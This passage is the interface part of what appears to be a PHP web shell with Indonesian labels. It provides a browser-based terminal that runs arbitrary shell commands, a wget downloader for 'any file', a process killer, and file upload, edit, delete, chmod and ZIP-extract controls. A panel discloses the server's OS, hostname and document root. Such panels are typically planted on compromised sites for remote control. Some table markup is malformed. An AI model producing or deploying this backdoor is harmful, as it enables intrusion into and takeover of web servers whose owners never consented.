                <button onclick="showModal('copyModal')" class="btn btn-info">📋 Copy/Move</button>
                <button onclick="executeSelected()" class="btn btn-danger">🗑 Delete Selected</button>
                <a href="?logout=1" class="btn btn-danger">🚪 Logout</a>
            </div>
        </div>
        
        <!-- LOGO BULAT DENGAN GAMBAR -->
        <div class="terminal-toggle-container">
            <form method="post" style="margin: 0;">
                <button type="submit" name="toggle_terminal" value="1" class="terminal-logo-btn">
                    <img src="https://iili.io/BSuPYCB.md.png" alt="Terminal Logo" onerror="this.style.display='none'; this.parentElement.innerHTML='<span class=\'emoji-fallback\' style=\'font-size:35px;\'>💻</span>';">
                </button>
            </form>
            <div class="toggle-status">
                <?php echo $terminal_visible ? '▼ Klik logo untuk TUTUP terminal ' : '▲ Klik logo = BUKA terminal'; ?>
            </div>
        </div>
        
        <!-- TERMINAL -->
        <div class="terminal-container <?php echo !$terminal_visible ? 'hidden' : ''; ?>">
            <div class="terminal-header">
                <span class="title">💻 TERMINAL</span>
                <span class="path">📍 <?php echo htmlspecialchars($current_dir); ?></span>
            </div>
            <div class="terminal-output" id="terminalOutput">
                <?php if (empty($terminal_lines)): ?>
                    <div style="color: #888;">═══════════════════════════════════════════════════════════<br>
                    ⚡ TERMINAL SIAP DIGUNAKAN! ⚡<br>
                    ═══════════════════════════════════════════════════════════<br>
                    📋 Perintah yang tersedia:<br>
                    • <strong style="color:#ffd93d;">ps aux</strong> → Lihat SEMUA proses yang berjalan ⭐<br>
                    • <strong style="color:#ffd93d;">ls -la</strong> → Lihat semua file dan folder<br>
                    • <strong style="color:#ffd93d;">wget URL -O nama</strong> → Download file APAPUN<br>
                    • <strong style="color:#ffd93d;">kill PID</strong> → Hentikan proses<br>
                    • <strong style="color:#ffd93d;">pwd</strong> → Lihat path saat ini<br>
                    • <strong style="color:#ffd93d;">cd folder</strong> → Pindah direktori<br>
                    • <strong style="color:#ffd93d;">clear</strong> → Bersihkan terminal<br>
                    ═══════════════════════════════════════════════════════════<br>
                    💡 <strong style="color:#10b981;">COBA SEKARANG:</strong> ketik <strong style="color:#ffd93d;">ps aux</strong> lalu ENTER<br>
                    ═══════════════════════════════════════════════════════════<br>
                    🧹 <strong style="color:#f59e0b;">NOTE:</strong> Terminal akan KOSONG saat ditutup dan dibuka lagi!<br>
                    ═══════════════════════════════════════════════════════════</div>
                <?php else: ?>
                    <?php foreach ($terminal_lines as $line): ?>
                        <div class="terminal-line">
                            <div class="terminal-command">
                                <span class="prompt">[<?php echo htmlspecialchars($line['time']); ?>] user@shell$</span>
                                <span class="command-text"> <?php echo htmlspecialchars($line['cmd']); ?></span>
                            </div>
                            <div class="terminal-output-text"><?php echo nl2br(htmlspecialchars($line['output'])); ?></div>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
            <div class="terminal-input-form">
                <form method="post" id="terminalForm">
                    <div class="terminal-input-group">
                        <span class="terminal-prompt">user@shell:<?php echo htmlspecialchars(basename($current_dir)); ?>$</span>
                        <input type="text" name="command" class="terminal-input" placeholder="Ketik perintah... (contoh: ps aux, ls -la, wget URL -O nama)" autocomplete="off" id="terminalInput">
                        <button type="submit" class="btn btn-primary">▶ Execute</button>
                    </div>
                    <div style="font-size: 11px; color: #888; margin-top: 8px;">
                        💡 Contoh: <strong style="color:#ffd93d;">ps aux</strong> | <strong style="color:#ffd93d;">ls -la</strong>
                    </div>
                </form>
            </div>
        </div>
        
        <!-- Messages -->
        <?php if (!empty($messages)): ?>
            <?php foreach ($messages as $msg): ?>
                <div class="message"><?php echo htmlspecialchars($msg); ?></div>
            <?php endforeach; ?>
        <?php endif; ?>
        
        <!-- Quick Actions -->
        <div class="grid-2">
            <div class="card">
                <h3>⚡ Quick Access <span class="badge">Fitur Cepat</span></h3>
                <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;">
                    <button onclick="showModal('createModal')" class="btn btn-primary">📄 Create</button>
                    <button onclick="showModal('uploadModal')" class="btn btn-primary">📤 Upload</button>
                    <button onclick="showModal('wgetModal')" class="btn btn-primary">📥 Wget</button>
                    <button onclick="showModal('processModal')" class="btn btn-warning">⚡ Processes</button>
                    <button onclick="showModal('chmodModal')" class="btn btn-info">🔐 Chmod</button>
                    <button onclick="showModal('renameModal')" class="btn btn-info">✏️ Rename</button>
                </div>
            </div>
            
            <div class="card">
                <h3>ℹ️ System Information <span class="badge">Info Sistem</span></h3>
                <div style="font-size: 13px; line-height: 1.8;">
                    <div><strong>🖥️ OS:</strong> <?php echo php_uname('s') . ' ' . php_uname('r'); ?></div>
                    <div><strong>🏠 Hostname:</strong> <?php echo php_uname('n'); ?></div>
                    <div><strong>📂 Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT'] ?? 'N/A'; ?></div>
                    <div><strong>⚡ Web Server:</strong> <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'N/A'; ?></div>
                    <div><strong>📅 Current Time:</strong> <?php echo date('Y-m-d H:i:s'); ?></div>
                </div>
            </div>
        </div>
        
        <!-- FILE MANAGER -->
        <div class="card" style="margin-bottom: 20px;">
            <h3>📂 File Manager <span class="badge">F168</span></h3>
            <div class="file-table-wrapper">
                <form method="post" id="filesForm">
                    <table class="file-table">
                        <thead>
                            <tr>
                                <th width="30"><input type="checkbox" id="selectAll" onclick="toggleSelectAll(this)"></th>
                                <th>Name</th>
                                <th>Size</th>
                                <th>Permission</th>
                                <th>Modified</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php if (!empty($dir_items)): ?>
                                <?php foreach ($dir_items as $item): ?>
                                    <tr>
                                        <td><input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item['name']); ?>" class="file-checkbox"></div>
                                        <td>
                                            <?php if ($item['is_dir']): ?>
                                                <a href="?path=<?php echo urlencode($item['path']); ?>" class="file-link folder-link">
                                                    📁 <?php echo htmlspecialchars($item['name']); ?>
                                                </a>
                                            <?php else: ?>
                                                <a href="?path=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($item['name']); ?>" class="file-link">
                                                    📄 <?php echo htmlspecialchars($item['name']); ?>
                                                </a>
                                            <?php endif; ?>
                                         </div>
                                        <td><?php echo $item['is_dir'] ? '📁' : format_size($item['size']); ?></div>
                                        <td><code><?php echo $item['perm']; ?></code></div>
                                        <td><?php echo $item['modified']; ?></div>
                                        <td>
                                            <button type="button" onclick="showRenameModal('<?php echo htmlspecialchars($item['name']); ?>')" class="btn btn-outline" style="padding: 4px 8px; font-size: 11px;" title="Rename">✏️</button>
                                            <button type="button" onclick="showChmodModal('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo $item['perm']; ?>')" class="btn btn-outline" style="padding: 4px 8px; font-size: 11px;" title="Chmod">🔐</button>
                                            <a href="?path=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($item['name']); ?>" class="btn btn-danger" style="padding: 4px 8px; font-size: 11px; text-decoration: none;" onclick="return confirm('Hapus <?php echo htmlspecialchars($item['name']); ?>?')" title="Delete">🗑</a>
                                            <?php if (preg_match('/\.zip$/i', $item['name'])): ?>
                                                <a href="?path=<?php echo urlencode($current_dir); ?>&extract=<?php echo urlencode($item['name']); ?>" class="btn btn-primary" style="padding: 4px 8px; font-size: 11px; text-decoration: none;" title="Extract">📦</a>
                                            <?php endif; ?>
                                            <?php if (!$item['is_dir']): ?>
                                                <a href="<?php echo htmlspecialchars($current_dir . '/' . $item['name']); ?>" target="_blank" class="btn btn-info" style="padding: 4px 8px; font-size: 11px; text-decoration: none;" title="Open">🔗</a>
                                            <?php endif; ?>
                                         </div>
                                    </tr>
                                <?php endforeach; ?>
                            <?php else: ?>
                                <tr><td colspan="6" style="text-align: center; padding: 40px;">📂 Directory is empty</td><ei
                            <?php endif; ?>
                        </tbody>
                    </table>
                </form>
            </div>
        </div>
        
        <!-- EDITOR -->
        <?php if ($edit_file !== null && $edit_content !== null): ?>
        <div class="card" style="margin-bottom: 20px;">
            <h3>✏️ Editing: <?php echo htmlspecialchars($edit_file); ?></h3>
            <form method="post">
                <textarea name="content" class="editor" spellcheck="false"><?php echo htmlspecialchars($edit_content); ?></textarea>
                <input type="hidden" name="filename" value="<?php echo htmlspecialchars($edit_file); ?>">
                <input type="hidden" name="save_file" value="1">
                <div style="margin-top: 15px; display: flex; gap: 10px;">
                    <button type="submit" class="btn btn-primary">💾 Save Changes</button>
                    <a href="?path=<?php echo urlencode($current_dir); ?>" class="btn btn-outline">❌ Cancel</a>
                </div>
            </form>
        </div>
        <?php endif; ?>
    </div>
    
    <!-- MODALS -->
    <div class="modal" id="createModal">
        <div class="modal-content">
            <h3>➕ Create New</h3>
            <form method="post">
                <input type="text" name="name" class="input" placeholder="Name" required>
                <select name="type" class="input">
                    <option value="file">📄 File</option>
                    <option value="folder">📁 Folder</option>
                </select>
                <textarea name="content" class="input" placeholder="File content" rows="5"></textarea>
                <input type="hidden" name="create" value="1">
                <div style="display: flex; gap: 10px; margin-top: 15px;">
                    <button type="submit" class="btn btn-primary">Create</button>
                    <button type="button" class="btn btn-outline" onclick="hideModal('createModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <div class="modal" id="uploadModal">
        <div class="modal-content">
            <h3>📤 Upload Files</h3>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="files[]" class="input" multiple required>
                <label class="checkbox-label"><input type="checkbox" name="auto_extract" value="1"> Auto-extract ZIP</label>
                <div style="display: flex; gap: 10px; margin-top: 15px;">
                    <button type="submit" class="btn btn-primary">Upload</button>
                    <button type="button" class="btn btn-outline" onclick="hideModal('uploadModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <div class="modal" id="wgetModal">
        <div class="modal-content">
            <h3>📥 Download with Wget</h3>
            <form method="post">
                <input type="text" name="wget_url" class="input" placeholder="URL: https://example.com/file.zip" required>
                <input type="text" name="custom_filename" class="input" placeholder="Custom filename (optional)">
                <div style="display: flex; gap: 10px; margin-top: 15px;">
                    <button type="submit" class="btn btn-primary">Download</button>
                    <button type="button" class="btn btn-outline" onclick="hideModal('wgetModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <div class="modal" id="processModal">
        <div class="modal-content">
            <h3>⚡ Process Manager</h3>
            <?php
            $ps_output = execute_command("ps aux --sort=-%cpu | head -30", $current_dir);
            ?>
            <div style="background: #1e1e1e; padding: 15px; border-radius: 8px; overflow: auto; max-height: 400px; font-family: monospace; font-size: 11px; margin-bottom: 15px; color: #d4d4d4;">
                <?php echo nl2br(htmlspecialchars($ps_output)); ?>
            </div>
            <form method="post">
                <input type="text" name="command" class="input" placeholder="kill [PID] or kill -9 [PID]">
                <button type="submit" class="btn btn-danger" style="width: 100%;">🔪 Kill Process</button>
            </form>
            <button type="button" class="btn btn-outline" style="margin-top: 10px; width: 100%;" onclick="hideModal('processModal')">Close</button>
        </div>
    </div>
    
    <div class="modal" id="copyModal">
        <div class="modal-content">
            <h3>📋 Copy/Move</h3>
            <form method="post" id="copyMoveForm">
                <input type="text" name="destination" class="input" placeholder="Destination folder" required>
                <select name="operation" class="input">
                    <option value="copy">📋 Copy</option>
                    <option value="move">↪️ Move</option>
                </select>
                <input type="hidden" name="copy_move" value="1">
                <div id="selectedItemsContainer"></div>
                <div style="display: flex; gap: 10px; margin-top: 15px;">
                    <button type="submit" class="btn btn-primary">Execute</button>
                    <button type="button" class="btn btn-outline" onclick="hideModal('copyModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <div class="modal" id="chmodModal">
        <div class="modal-content">
            <h3>🔐 Change Permissions</h3>
            <form method="post">
                <input type="text" id="chmodItem" name="chmod_item" class="input" placeholder="File/Folder name" required>
                <select name="mode" class="input">
                    <option value="0644">0644 - rw-r--r--</option>
                    <option value="0755">0755 - rwxr-xr-x</option>
                    <option value="0777">0777 - rwxrwxrwx</option>
                    <option value="0600">0600 - rw-------</option>
                </select>
                <input type="hidden" name="chmod" value="1">
                <div style="display: flex; gap: 10px; margin-top: 15px;">
                    <button type="submit" class="btn btn-primary">Change</button>
                    <button type="button" class="btn btn-outline" onclick="hideModal('chmodModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <div class="modal" id="renameModal">
        <div class="modal-content">
            <h3>🏷️ Rename</h3>
            <form method="post">
                <input type="text" id="renameItem" name="old_name" class="input" required readonly>
                <input type="text" name="new_name" class="input" placeholder="New name" required>
                <input type="hidden" name="rename" value="1">
                <div style="display: flex; gap: 10px; margin-top: 15px;">
                    <button type="submit" class="btn btn-primary">Rename</button>
                    <button type="button" class="btn btn-outline" onclick="hideModal('renameModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <script>
        function showModal(id) { document.getElementById(id).style.display = 'flex'; }
        function hideModal(id) { document.getElementById(id).style.display = 'none'; }
        
        function showChmodModal(item, perm) {
            document.getElementById('chmodItem').value = item;
            showModal('chmodModal');
        }
        
        function showRenameModal(item) {
            document.getElementById('renameItem').value = item;
            showModal('renameModal');
        }
        
        function toggleSelectAll(checkbox) {
            document.querySelectorAll('.file-checkbox').forEach(cb => cb.checked = checkbox.checked);
        }
        
        function executeSelected() {
            const selected = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.value);
            if (selected.length === 0) { alert('Pilih file/folder terlebih dahulu'); return; }
            if (confirm(`Hapus ${selected.length} item yang dipilih?`)) {
                const form = document.createElement('form');
                form.method = 'post';
                selected.forEach(item => {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = 'selected_items[]';
                    input.value = item;
                    form.appendChild(input);
                });
                const del = document.createElement('input');
                del.type = 'hidden';
                del.name = 'delete_selected';
                del.value = '1';
                form.appendChild(del);
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        function prepareCopyMove() {
            const selected = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.value);
            const container = document.getElementById('selectedItemsContainer');
            container.innerHTML = '';
            selected.forEach(item => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'selected_items[]';
                input.value = item;
                container.appendChild(input);
            });
            if (selected.length === 0) { alert('Pilih file/folder terlebih dahulu'); return false; }
            return true;
        }
        
        const copyForm = document.getElementById('copyMoveForm');
        if (copyForm) {
            copyForm.addEventListener('submit', function(e) {
                if (!prepareCopyMove()) e.preventDefault();
            });
        }
        
        const terminalOutput = document.getElementById('terminalOutput');
        if (terminalOutput) terminalOutput.scrollTop = terminalOutput.scrollHeight;
        
        const terminalInput = document.getElementById('terminalInput');
        if (terminalInput) {
            terminalInput.focus();
            terminalInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') this.form.submit();
            });
        }
        
        window.onclick = function(event) {
            if (event.target.classList.contains('modal')) event.target.style.display = 'none';
        }
        
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.shiftKey && e.key === 'T') {
                e.preventDefault();
                document.querySelector('button[name="toggle_terminal"]')?.click();
            }
            if (e.ctrlKey && e.key === 'r') {
                e.preventDefault();
                window.location.href = '?path=<?php echo urlencode($current_dir); ?>';
            }
        });
    </script>
</body>
</html>
